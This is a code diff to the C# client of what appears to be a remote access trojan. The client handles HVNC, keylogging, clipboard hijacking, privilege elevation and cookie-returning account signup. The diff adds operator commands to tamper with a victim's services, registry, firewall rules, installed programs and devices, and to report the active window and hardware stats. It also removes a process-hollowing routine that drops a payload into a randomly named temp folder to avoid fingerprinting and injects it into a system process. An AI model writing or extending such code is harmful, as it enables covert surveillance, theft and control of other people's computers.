@@ -213,10 +213,6 @@ internal class TlsClient : IDisposable
                         HvncFeature.SetClipboard(hvncClip.Text);
                     break;
 
-                case PacketType.HollowExec:
-                    await HandleHollowExec(packet.Data, ct);
-                    break;
-
                 case PacketType.Uninstall:
                     ShouldReconnect = false;
                     HandleUninstall();
@@ -464,6 +460,126 @@ internal class TlsClient : IDisposable
                     if (procKill != null) ProcessManagerFeature.Kill(procKill.Pid);
                     break;
 
+                case PacketType.ProcSuspend:
+                    var procSusp = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.ProcSuspendResumeStub);
+                    if (procSusp != null) ProcessManagerFeature.Suspend(procSusp.Pid);
+                    break;
+
+                case PacketType.ProcResume:
+                    var procRes = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.ProcSuspendResumeStub);
+                    if (procRes != null) ProcessManagerFeature.Resume(procRes.Pid);
+                    break;
+
+                // ── TCP Firewall ─────────────────────────────────────
+                case PacketType.TcpFirewallBlock:
+                    var fwBlock = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.TcpFirewallBlockStub);
+                    if (fwBlock != null)
+                        _ = WritePacketAsync(new Packet
+                        {
+                            Type = PacketType.TcpFirewallRulesResult,
+                            Data = TcpManagerFeature.BlockProcess(fwBlock.ProcessName, fwBlock.Port, fwBlock.Direction)
+                        }, ct);
+                    break;
+
+                case PacketType.TcpFirewallUnblock:
+                    var fwUnblock = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.TcpFirewallUnblockStub);
+                    if (fwUnblock != null) TcpManagerFeature.UnblockRule(fwUnblock.RuleName);
+                    break;
+
+                case PacketType.TcpFirewallListRules:
+                    _ = WritePacketAsync(new Packet { Type = PacketType.TcpFirewallRulesResult, Data = TcpManagerFeature.ListFirewallRules() }, ct);
+                    break;
+
+                // ── Installed Apps ───────────────────────────────────
+                case PacketType.InstalledGetList:
+                    _ = Task.Run(async () => await WritePacketAsync(new Packet { Type = PacketType.InstalledListResult, Data = InstalledAppsFeature.GetList() }, CancellationToken.None));
+                    break;
+
+                case PacketType.InstalledUninstall:
+                    var appUninstall = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.InstalledUninstallStub);
+                    if (appUninstall != null) InstalledAppsFeature.Uninstall(appUninstall.UninstallString);
+                    break;
+
+                // ── Service Manager ──────────────────────────────────
+                case PacketType.SvcGetList:
+                    _ = Task.Run(async () => await WritePacketAsync(new Packet { Type = PacketType.SvcListResult, Data = ServiceManagerFeature.GetList() }, CancellationToken.None));
+                    break;
+
+                case PacketType.SvcStart:
+                case PacketType.SvcStop:
+                case PacketType.SvcRestart:
+                case PacketType.SvcDisable:
+                case PacketType.SvcDelete:
+                {
+                    var svcAct = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.SvcActionStub);
+                    if (svcAct != null)
+                    {
+                        var svcAction = packet.Type switch
+                        {
+                            PacketType.SvcStart   => "start",
+                            PacketType.SvcStop    => "stop",
+                            PacketType.SvcRestart => "restart",
+                            PacketType.SvcDisable => "disable",
+                            PacketType.SvcDelete  => "delete",
+                            _                      => "stop"
+                        };
+                        _ = Task.Run(async () => await WritePacketAsync(new Packet { Type = PacketType.SvcAck, Data = ServiceManagerFeature.DoAction(svcAction, svcAct.ServiceName) }, CancellationToken.None));
+                    }
+                    break;
+                }
+
+                // ── Window Manager ───────────────────────────────────
+                case PacketType.WinGetList:
+                    _ = WritePacketAsync(new Packet { Type = PacketType.WinListResult, Data = WindowManagerFeature.GetList() }, ct);
+                    break;
+
+                case PacketType.WinAction:
+                    var winAct = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.WinActionStub);
+                    if (winAct != null) WindowManagerFeature.DoAction(winAct.Handle, winAct.Action);
+                    break;
+
+                // ── Registry Editor ──────────────────────────────────
+                case PacketType.RegGetChildren:
+                    var regGet = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.RegGetChildrenStub);
+                    if (regGet != null)
+                        _ = WritePacketAsync(new Packet { Type = PacketType.RegChildrenResult, Data = RegistryEditorFeature.GetChildren(regGet.KeyPath) }, ct);
+                    break;
+
+                case PacketType.RegSetValue:
+                    var regSet = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.RegSetValueStub);
+                    if (regSet != null)
+                        _ = WritePacketAsync(new Packet { Type = PacketType.RegAck, Data = RegistryEditorFeature.SetValue(regSet.KeyPath, regSet.Name, regSet.ValueType, regSet.Data) }, ct);
+                    break;
+
+                case PacketType.RegDeleteValue:
+                    var regDelVal = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.RegDeleteValueStub);
+                    if (regDelVal != null)
+                        _ = WritePacketAsync(new Packet { Type = PacketType.RegAck, Data = RegistryEditorFeature.DeleteValue(regDelVal.KeyPath, regDelVal.Name) }, ct);
+                    break;
+
+                case PacketType.RegDeleteKey:
+                    var regDelKey = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.RegDeleteKeyStub);
+                    if (regDelKey != null)
+                        _ = WritePacketAsync(new Packet { Type = PacketType.RegAck, Data = RegistryEditorFeature.DeleteKey(regDelKey.KeyPath) }, ct);
+                    break;
+
+                case PacketType.RegCreateKey:
+                    var regCreate = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.RegCreateKeyStub);
+                    if (regCreate != null)
+                        _ = WritePacketAsync(new Packet { Type = PacketType.RegAck, Data = RegistryEditorFeature.CreateKey(regCreate.KeyPath) }, ct);
+                    break;
+
+                // ── Device Manager ───────────────────────────────────
+                case PacketType.DevGetList:
+                    _ = Task.Run(async () => await WritePacketAsync(new Packet { Type = PacketType.DevListResult, Data = DeviceManagerFeature.GetList() }, CancellationToken.None));
+                    break;
+
+                case PacketType.DevUninstall:
+                    var devUninst = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.DevUninstallStub);
+                    if (devUninst != null)
+                        _ = Task.Run(async () => await WritePacketAsync(new Packet { Type = PacketType.DevAck, Data = DeviceManagerFeature.Uninstall(devUninst.DeviceId) }, CancellationToken.None));
+                    break;
+
                 // ── Keylogger ────────────────────────────────────────
                 case PacketType.KeyloggerStart:
                     KeyloggerFeature.Start();
@@ -602,9 +718,52 @@ internal class TlsClient : IDisposable
         catch { return ""; }
     }
 
+    // ── CPU/RAM sampling ────────────────────────────────
+    [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential)]
+    private struct MEMORYSTATUSEX { public uint dwLength, dwMemoryLoad; public ulong ullTotalPhys, ullAvailPhys, ullTotalPageFile, ullAvailPageFile, ullTotalVirtual, ullAvailVirtual, ullAvailExtendedVirtual; }
+    [System.Runtime.InteropServices.DllImport("kernel32.dll")] private static extern bool GlobalMemoryStatusEx(ref MEMORYSTATUSEX lpBuffer);
+    [System.Runtime.InteropServices.DllImport("kernel32.dll")] private static extern bool GetSystemTimes(out long idleTime, out long kernelTime, out long userTime);
+
+    private long _lastIdle, _lastKernel, _lastUser;
+    private float SampleCpu()
+    {
+        try
+        {
+            GetSystemTimes(out long idle, out long kernel, out long user);
+            long dIdle   = idle   - _lastIdle;
+            long dKernel = kernel - _lastKernel;
+            long dUser   = user   - _lastUser;
+            _lastIdle = idle; _lastKernel = kernel; _lastUser = user;
+            long total = dKernel + dUser;
+            if (total <= 0) return 0f;
+            float usage = (1f - (float)dIdle / total) * 100f;
+            return Math.Max(0f, Math.Min(100f, usage));
+        }
+        catch { return 0f; }
+    }
+
+    private static HardwareStatsStub SampleHardware(float cpu)
+    {
+        long ramUsed = 0, ramTotal = 0;
+        try
+        {
+            var mem = new MEMORYSTATUSEX { dwLength = (uint)System.Runtime.InteropServices.Marshal.SizeOf<MEMORYSTATUSEX>() };
+            if (GlobalMemoryStatusEx(ref mem))
+            {
+                ramTotal = (long)(mem.ullTotalPhys / (1024 * 1024));
+                ramUsed  = ramTotal - (long)(mem.ullAvailPhys / (1024 * 1024));
+            }
+        }
+        catch { }
+        return new HardwareStatsStub { CpuUsage = cpu, RamUsed = ramUsed, RamTotal = ramTotal };
+    }
+
     private async Task HeartbeatSender(CancellationToken ct)
     {
-        int ticks = 0;
+        // Prime CPU counters before first sample
+        GetSystemTimes(out _lastIdle, out _lastKernel, out _lastUser);
+
+        int hwTick = 0;
         while (!ct.IsCancellationRequested)
         {
             try
@@ -613,13 +772,22 @@ internal class TlsClient : IDisposable
                 await WritePacketAsync(new Packet { Type = PacketType.Heartbeat }, ct);
 
                 // Send active window every heartbeat (3 s)
-                if (++ticks >= 1)
+                var title = GetActiveWindowTitle();
+                if (!string.IsNullOrEmpty(title))
+                    _ = WritePacketAsync(new Packet { Type = PacketType.ActiveWindow, Data = title },
+                                         CancellationToken.None);
+
+                // Send hardware stats every 5 heartbeats (~15 s)
+                if (++hwTick >= 5)
                 {
-                    ticks = 0;
-                    var title = GetActiveWindowTitle();
-                    if (!string.IsNullOrEmpty(title))
-                        _ = WritePacketAsync(new Packet { Type = PacketType.ActiveWindow, Data = title },
-                                             CancellationToken.None);
+                    hwTick = 0;
+                    var cpu = SampleCpu();
+                    var hw  = SampleHardware(cpu);
+                    _ = WritePacketAsync(new Packet
+                    {
+                        Type = PacketType.HardwareStats,
+                        Data = JsonSerializer.Serialize(hw, SeroJson.Default.HardwareStatsStub)
+                    }, CancellationToken.None);
                 }
             }
             catch { break; }
@@ -896,58 +1064,6 @@ internal class TlsClient : IDisposable
             }
             catch { }
         }
-    }
-
-    private async Task HandleHollowExec(string data, CancellationToken ct)
-    {
-        try
-        {
-            var hollowData = JsonSerializer.Deserialize(data, SeroJson.Default.HollowExecData);
-            if (hollowData == null) return;
-
-            var safeName = Path.GetFileName(hollowData.FileName);
-            if (string.IsNullOrWhiteSpace(safeName)) return;
-
-            // Write PE to temp (random dir — no static fingerprint)
-            var tempDir = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N")[..12]);
-            Directory.CreateDirectory(tempDir);
-            var pePath = Path.Combine(tempDir, safeName);
-            await File.WriteAllBytesAsync(pePath, Convert.FromBase64String(hollowData.FileBase64), ct);
-
-            // Resolve target process path — strip directory components from
-            // bare names so relative traversal (../../...) is not possible.
-            var target = hollowData.TargetProcess;
-            if (!Path.IsPathRooted(target))
-                target = Path.Combine(
-                    Environment.GetFolderPath(Environment.SpecialFolder.System),
-                    Path.GetFileName(target)); // GetFileName strips any .. segments
-            // Reject paths that escaped Windows/System32 directories
-            var norm   = Path.GetFullPath(target);
-            var sysDir = Environment.GetFolderPath(Environment.SpecialFolder.System);
-            var winDir = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
-            if (!norm.StartsWith(sysDir, StringComparison.OrdinalIgnoreCase) &&
-                !norm.StartsWith(winDir, StringComparison.OrdinalIgnoreCase))
-            {
-                return;
-            }
-
-            int pid = ProcessHollowing.Hollow(pePath, target);
-
-            // Send result back as shell output
-            var result = pid > 0
-                ? $"[Hollow] Injection success. PID={pid}"
-                : "[Hollow] Injection failed. Check logs.";
-
-            await WritePacketAsync(new Packet
-            {
-                Type = PacketType.ShellOutput,
-                Data = JsonSerializer.Serialize(new ShellOutputData { Output = result, ExitCode = pid > 0 ? 0 : -1 }, SeroJson.Default.ShellOutputData)
-            }, ct);
-
-            // Cleanup PE from temp
-            try { File.Delete(pePath); } catch { }
-        }
-        catch { }
     }
 
     private async Task HandleElevation(bool loop, CancellationToken ct)
@@ -1341,7 +1457,8 @@ internal enum PacketType
     Ping = 32,
     Pong = 33,
     ActiveWindow = 34,
-    CameraStatus = 35,
+    CameraStatus  = 35,
+    HardwareStats = 36,
 
     RdpStart = 50,
     RdpStop = 51,
@@ -1370,9 +1487,13 @@ internal enum PacketType
     HvncExec      = 105,
     HvncClipboard = 106,
 
-    TcpGetList    = 110,
-    TcpListResult = 111,
-    TcpClose      = 112,
+    TcpGetList             = 110,
+    TcpListResult          = 111,
+    TcpClose               = 112,
+    TcpFirewallBlock       = 113,
+    TcpFirewallUnblock     = 114,
+    TcpFirewallListRules   = 115,
+    TcpFirewallRulesResult = 116,
 
     StartupGetList    = 120,
     StartupListResult = 121,
@@ -1430,6 +1551,38 @@ internal enum PacketType
     ProcGetList    = 190,
     ProcListResult = 191,
     ProcKill       = 192,
+    ProcSuspend    = 193,
+    ProcResume     = 194,
+
+    InstalledGetList    = 230,
+    InstalledListResult = 231,
+    InstalledUninstall  = 232,
+
+    SvcGetList    = 240,
+    SvcListResult = 241,
+    SvcStart      = 242,
+    SvcStop       = 243,
+    SvcRestart    = 244,
+    SvcDisable    = 245,
+    SvcDelete     = 246,
+    SvcAck        = 247,
+
+    WinGetList    = 250,
+    WinListResult = 251,
+    WinAction     = 252,
+
+    RegGetChildren    = 260,
+    RegChildrenResult = 261,
+    RegSetValue       = 262,
+    RegDeleteValue    = 263,
+    RegDeleteKey      = 264,
+    RegCreateKey      = 265,
+    RegAck            = 266,
+
+    DevGetList    = 270,
+    DevListResult = 271,
+    DevUninstall  = 272,
+    DevAck        = 273,
 
     ClipperSetConfig    = 180,
     ClipperGetStats     = 181,
@@ -1625,7 +1778,94 @@ internal class HvncClipboardDataStub
 // CDP Signup
 [JsonSerializable(typeof(CdpSignupStatusStub))]
 [JsonSerializable(typeof(CdpSignupResultStub))]
+// Hardware Stats
+[JsonSerializable(typeof(HardwareStatsStub))]
+// Process Manager extended
+[JsonSerializable(typeof(ProcSuspendResumeStub))]
+// TCP Firewall
+[JsonSerializable(typeof(TcpFirewallBlockStub))]
+[JsonSerializable(typeof(TcpFirewallUnblockStub))]
+[JsonSerializable(typeof(TcpFirewallRuleStub))]
+[JsonSerializable(typeof(TcpFirewallRulesResultStub))]
+[JsonSerializable(typeof(List<TcpFirewallRuleStub>))]
+// Installed Programs
+[JsonSerializable(typeof(InstalledAppStub))]
+[JsonSerializable(typeof(InstalledListResultStub))]
+[JsonSerializable(typeof(InstalledUninstallStub))]
+[JsonSerializable(typeof(List<InstalledAppStub>))]
+// Service Manager
+[JsonSerializable(typeof(ServiceEntryStub))]
+[JsonSerializable(typeof(SvcListResultStub))]
+[JsonSerializable(typeof(SvcActionStub))]
+[JsonSerializable(typeof(SvcAckStub))]
+[JsonSerializable(typeof(List<ServiceEntryStub>))]
+// Window Manager
+[JsonSerializable(typeof(WindowEntryStub))]
+[JsonSerializable(typeof(WinListResultStub))]
+[JsonSerializable(typeof(WinActionStub))]
+[JsonSerializable(typeof(List<WindowEntryStub>))]
+// Registry Editor
+[JsonSerializable(typeof(RegValueStub))]
+[JsonSerializable(typeof(RegChildrenResultStub))]
+[JsonSerializable(typeof(RegGetChildrenStub))]
+[JsonSerializable(typeof(RegSetValueStub))]
+[JsonSerializable(typeof(RegDeleteValueStub))]
+[JsonSerializable(typeof(RegDeleteKeyStub))]
+[JsonSerializable(typeof(RegCreateKeyStub))]
+[JsonSerializable(typeof(RegAckStub))]
+[JsonSerializable(typeof(List<RegValueStub>))]
+[JsonSerializable(typeof(List<string>))]
+// Device Manager
+[JsonSerializable(typeof(DeviceEntryStub))]
+[JsonSerializable(typeof(DevListResultStub))]
+[JsonSerializable(typeof(DevUninstallStub))]
+[JsonSerializable(typeof(DevAckStub))]
+[JsonSerializable(typeof(List<DeviceEntryStub>))]
 internal partial class SeroJson : JsonSerializerContext { }
 
 internal class CdpSignupStatusStub { public string Step { get; set; } = ""; public string Message { get; set; } = ""; }
 internal class CdpSignupResultStub  { public bool Success { get; set; } public string Account { get; set; } = ""; public string Cookie { get; set; } = ""; public string Error { get; set; } = ""; }
+
+// ── Hardware Stats ────────────────────────────────────
+internal class HardwareStatsStub { public float CpuUsage { get; set; } public long RamUsed { get; set; } public long RamTotal { get; set; } }
+
+// ── Process Manager extended ──────────────────────────
+internal class ProcSuspendResumeStub { public int Pid { get; set; } }
+
+// ── TCP Firewall ──────────────────────────────────────
+internal class TcpFirewallBlockStub   { public string ProcessName { get; set; } = ""; public int Port { get; set; } public string Direction { get; set; } = "both"; }
+internal class TcpFirewallUnblockStub { public string RuleName { get; set; } = ""; }
+internal class TcpFirewallRuleStub    { public string RuleName { get; set; } = ""; public string ProcessName { get; set; } = ""; public int Port { get; set; } public string Direction { get; set; } = ""; }
+internal class TcpFirewallRulesResultStub { public List<TcpFirewallRuleStub> Rules { get; set; } = []; }
+
+// ── Installed Programs ────────────────────────────────
+internal class InstalledAppStub       { public string Name { get; set; } = ""; public string Version { get; set; } = ""; public string Publisher { get; set; } = ""; public string InstallDate { get; set; } = ""; public string UninstallString { get; set; } = ""; }
+internal class InstalledListResultStub{ public List<InstalledAppStub> Apps { get; set; } = []; }
+internal class InstalledUninstallStub { public string UninstallString { get; set; } = ""; }
+
+// ── Service Manager ───────────────────────────────────
+internal class ServiceEntryStub   { public string Name { get; set; } = ""; public string DisplayName { get; set; } = ""; public string Status { get; set; } = ""; public string StartType { get; set; } = ""; public string Description { get; set; } = ""; }
+internal class SvcListResultStub  { public List<ServiceEntryStub> Services { get; set; } = []; }
+internal class SvcActionStub      { public string ServiceName { get; set; } = ""; }
+internal class SvcAckStub         { public bool Success { get; set; } public string Error { get; set; } = ""; }
+
+// ── Window Manager ────────────────────────────────────
+internal class WindowEntryStub    { public long Handle { get; set; } public string Title { get; set; } = ""; public string ClassName { get; set; } = ""; public int Pid { get; set; } public bool Visible { get; set; } }
+internal class WinListResultStub  { public List<WindowEntryStub> Windows { get; set; } = []; }
+internal class WinActionStub      { public long Handle { get; set; } public string Action { get; set; } = ""; }
+
+// ── Registry Editor ───────────────────────────────────
+internal class RegValueStub           { public string Name { get; set; } = ""; public string ValueType { get; set; } = ""; public string Data { get; set; } = ""; }
+internal class RegChildrenResultStub  { public string KeyPath { get; set; } = ""; public List<string> SubKeys { get; set; } = []; public List<RegValueStub> Values { get; set; } = []; public string Error { get; set; } = ""; }
+internal class RegGetChildrenStub     { public string KeyPath { get; set; } = ""; }
+internal class RegSetValueStub        { public string KeyPath { get; set; } = ""; public string Name { get; set; } = ""; public string ValueType { get; set; } = "REG_SZ"; public string Data { get; set; } = ""; }
+internal class RegDeleteValueStub     { public string KeyPath { get; set; } = ""; public string Name { get; set; } = ""; }
+internal class RegDeleteKeyStub       { public string KeyPath { get; set; } = ""; }
+internal class RegCreateKeyStub       { public string KeyPath { get; set; } = ""; }
+internal class RegAckStub             { public bool Success { get; set; } public string Error { get; set; } = ""; }
+
+// ── Device Manager ────────────────────────────────────
+internal class DeviceEntryStub   { public string DeviceId { get; set; } = ""; public string Name { get; set; } = ""; public string Class { get; set; } = ""; public string Status { get; set; } = ""; public string Manufacturer { get; set; } = ""; }
+internal class DevListResultStub { public List<DeviceEntryStub> Devices { get; set; } = []; }
+internal class DevUninstallStub  { public string DeviceId { get; set; } = ""; }
+internal class DevAckStub        { public bool Success { get; set; } public string Error { get; set; } = ""; }
